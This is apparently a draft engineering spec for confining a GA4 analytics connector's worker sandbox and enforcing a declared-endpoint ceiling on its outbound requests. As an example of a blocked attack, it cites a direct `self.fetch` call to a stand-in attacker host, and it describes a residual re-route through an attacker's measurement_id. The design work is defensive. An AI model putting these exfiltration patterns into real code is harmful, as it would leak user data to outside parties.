---
status: DRAFT
dependencies: []
last_verified:
frame_review: true
---

<!-- jig grounding (spec 064-02 / ADR-0020): ground factual claims about
     runnable surfaces by probe first (run it / read source) or a citation. -->

## Slice 016-01 — GA4: confine the chamber + wire-protocol endpoint ceiling (the EXACT archetype)

**Goal:** Give the GA4 endpoint ceiling **real teeth** by closing **both** egress routes a compromised
GA4 chamber has. (1) **Fold in GA4-chamber egress-confinement**: withhold the GA4 chamber's ambient
network primitives (`fetch`/XHR/WebSocket/…) so its `ready` postMessage is the **sole** egress — a
direct in-worker `self.fetch("https://evil.com")` is **denied**. (2) **Enforce the endpoint ceiling** at
the async worker dispatch seam (`core/airlock.js`'s `worker.onmessage` → `fetch(r.url)`): a generic
`core/` control checks the outbound **origin + pathname** against the host connector's **declared
endpoints** and **HOLDS** an undeclared destination + surfaces it (009-02). Confinement makes the seam
the only door; the ceiling guards that door. GA4 is the **exact** ceiling (bounded fixed endpoint). Keep
it narrow (one archetype, one seam).

**DoR:**
- ✅ [ADR-0006](../../decisions/adr-0006-capability-manifest.md) Accepted — the ceiling law
  (`granted = declared ∩ host-policy ∩ consent`, declaration-as-ceiling, fails-closed). This slice
  enforces the **`declared`** term at the wire-protocol seam.
- ✅ The confinement primitive exists: `connectors/alloy/egress-confinement.js` (`applyEgressConfinement`,
  pure — operates on a passed-in scope) withholds ambient network for the alloy chamber; it is the
  vendor-neutral basis for GA4-chamber confinement (relocated to `core/` for shared use, or reused).
- ✅ The manifest declares `endpoints` (`connectors/ga4/connector.js` → `[...new Set(config.endpoints)]`;
  `handle` posts `{ url: endpoints[t] }`) — self-consistent with the deploy-time config. Grounded.
- ✅ The async worker dispatch seam (`core/airlock.js` `worker.onmessage` → `fetch(r.url)`) + the 009-02
  diagnostics seam exist. Grounded.

**Acceptance Criteria:**

1. **Generic ceiling control in `core/` (vendor-neutral, origin+pathname).** A new
   `core/endpoint-ceiling.js` exports `checkEndpointCeiling(url, declaredEndpoints)` →
   `{ verdict: "allow" | "hold", destination, reason }`, reducing **both** the outbound url and every
   declared endpoint to **origin + pathname** (dropping query + fragment); it holds unless the outbound
   origin+path ∈ the declared set. No connector specifics in `core/`; `test/core-boundary.test.js` stays
   green.
2. **GA4-chamber egress-confinement folded in (the `ready` postMessage is the SOLE egress).** Apply
   generic egress-confinement to the GA4 chamber (`core/chamber.worker.js`) so its ambient network
   primitives are withheld — **including `fetch`** (unlike alloy, GA4's `fetch` is *not* a mediated
   surface; GA4's egress is the `ready` postMessage, so `fetch` is withheld too, not preserved). Observable:
   a direct in-worker `self.fetch(…)` / `new XMLHttpRequest()` / `new WebSocket(…)` in the GA4 chamber
   **throws** (withheld); the honest GA4 `handle` (map → `busy` → `ready`) is **unaffected** (it uses no
   ambient network — re-verified against `core/connector-host.js` + `connectors/ga4/connector.js`).
3. **Ceiling wired into the async worker seam (fail-closed).** In `core/airlock.js`'s `worker.onmessage`,
   **before** `fetch(r.url)`, each `ready` request is checked against the connector's declared endpoints;
   an undeclared destination is **HELD** — no `fetch` issued. Observable: a `ready` request to an
   undeclared origin+path → **zero** egress; a declared one dispatches unchanged.
4. **ALERT — every held destination surfaced (009-02).** A held request emits
   `{ level: "error", kind: "endpoint-ceiling", disposition: "held", destination, reason }` through the
   `onDiagnostic` sink; `destination` names the outbound **origin+pathname** (not a user identifier;
   query/body never included, so no `api_secret` leak). The honest path emits **none**.
5. **Per-connector attribution threaded in (not read from the request).** The declared endpoints are the
   **host connector's**, passed to `createAirlock` at construction (it already receives `endpoints`) and
   reduced to the ceiling set there — not derived from `r.url`. Observable: chamber code cannot widen its
   own ceiling. (Single-connector-per-host today; multi-chamber attribution is a named forward-looking
   follow-up.)
6. **The sync fast path's destination is config-pinned — asserted, not gated.** `core/egress.js` posts to
   `endpoints[t]` (host config, main-thread) — not chamber-chosen. A test asserts the invariant (its
   destinations ⊆ the declared set); no redundant ceiling gate is added there.
7. **E2E: BOTH compromised-chamber routes are closed.** A `test/` harness proves: (a) a chamber that
   attempts a **direct in-worker `self.fetch`** to a foreign sink is **denied** (confinement throws — no
   network); (b) a chamber that emits an **undeclared `ready`** destination is **held** at the async seam
   + a `endpoint-ceiling` diagnostic; (c) the **honest** path (a `ready` request to a declared endpoint)
   **dispatches** + silent. (a)+(b) together are the foreign-sink teeth.
8. **Named residual — the tenant-in-query re-route is NOT closed here.** Because the ceiling compares
   origin+path only, a compromised chamber posting to the **declared** GA4 origin+path with an
   **attacker's `measurement_id`** (GA4's tenant key, in the query) is **allowed** — the same-host tenant
   re-route. This is **out of the endpoint ceiling's surface by design** (it is config-integrity's job,
   **deferred for GA4** by spec 015). The slice **names** this residual (in a comment + refinement-todo);
   it does **not** claim to close it.

**DoD:**
- [ ] ACs 1–8 pass — a direct in-worker fetch is denied AND an undeclared `ready` is held + alerted; the
      honest path dispatches + silent; the sync-path invariant holds; the tenant-in-query residual is
      named. Green against targeted tests. _(Do NOT run the full suite unguarded — the stale worktree's
      oracle/conformance tests hang it; run targeted files.)_
- [ ] **No regression** — the alloy chamber's confinement + config-integrity (015) + coalescing +
      contract-stability stay green; the honest GA4 map/egress path unchanged.
- [ ] Reviews: compliance + craft + **arch** (a new `core/` enforcement seam + folding chamber
      confinement into the GA4 chamber + a data-flow change: attribution threaded to dispatch) +
      reconciliation, recorded pass.
- [ ] Deviation log + reconciliation sweep; the 012-04 advisory→authoritative flip reflected;
      `docs/refinement-todo.md` gets the tenant-in-query (GA4 config-integrity) + multi-chamber-attribution
      + host-policy-layer follow-ups; `docs/releases/mvp3.md` Include row updated.
- [ ] **No secrets committed** — no `api_secret`/`measurement_id` in any manifest, fixture, or diagnostic;
      synthetic hosts only; the ceiling compares origin+path (query dropped).

**Anti-horizontal-phasing check:** after this slice, a compromised **GA4** chamber can **neither** reach
the network around the seam (confined) **nor** post through the seam to an undeclared destination (ceiling)
— its foreign-sink egress is closed on both routes and any attempt is surfaced. Observable value: the
first *confined-and-ceilinged* egress path in `core/`, exact for the wire-protocol archetype. (The
tenant-in-query re-route is a named residual; alloy's floor is 016-02.)
